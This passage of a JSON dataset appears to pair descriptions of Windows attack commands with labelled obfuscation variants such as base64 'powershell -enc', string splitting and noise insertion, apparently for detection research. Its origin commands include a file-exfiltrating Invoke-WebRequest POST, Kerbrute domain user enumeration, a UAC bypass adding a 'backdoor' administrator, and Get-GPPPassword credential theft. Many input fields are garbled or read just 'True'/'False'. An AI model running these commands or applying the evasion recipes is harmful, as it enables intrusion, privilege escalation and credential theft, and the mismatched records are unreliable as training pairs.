    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ":: In: Put Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": \"InjectView.exe\" This: \"Start Notepad and another process (InjectView.exe) in the Atomics folder\" .",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": (This would): (This would paraphrase:) Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ":: In: Put Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": \"InjectView.exe\" This: \"Start Notepad and another process (InjectView.exe) in the Atomics folder\" .",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": (This would): (This would paraphrase:) Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an HTTP POST request to a specified IP address with the content of a file as the body.",
    "origin_cmd": "Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change to the temporary directory, execute Kerbrute to perform user enumeration on a domain controller, and save the results to a file.",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\\username.txt"
  },
  {
    "input": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": Bypass User Account Control (UAC). So lets (the right): Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": by David Mohr: Bypass User Account Control (UAC), and execute commands to create a user and add it to the administrators group.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": This sentence is an accurate (originally used): Bypass User Account Control (UAC).",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": Bypass User Account Control (UAC). So lets (the right): Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": by David Mohr: Bypass User Account Control (UAC), and execute commands to create a user and add it to the administrators group.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": This sentence is an accurate (originally used): Bypass User Account Control (UAC).",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": Bypass User Account Control (UAC). So lets (the right): Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": by David Mohr: Bypass User Account Control (UAC), and execute commands to create a user and add it to the administrators group.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": This sentence is an accurate (originally used): Bypass User Account Control (UAC).",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": Bypass User Account Control (UAC). So lets (the right): Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": by David Mohr: Bypass User Account Control (UAC), and execute commands to create a user and add it to the administrators group.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": ": This sentence is an accurate (originally used): Bypass User Account Control (UAC).",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Bypass User Account Control (UAC) and execute commands to create a new user and add it to the administrators group.",
    "origin_cmd": "Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": ". ${gpp_script_path} ; Get-GPPPassword -Verbose",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
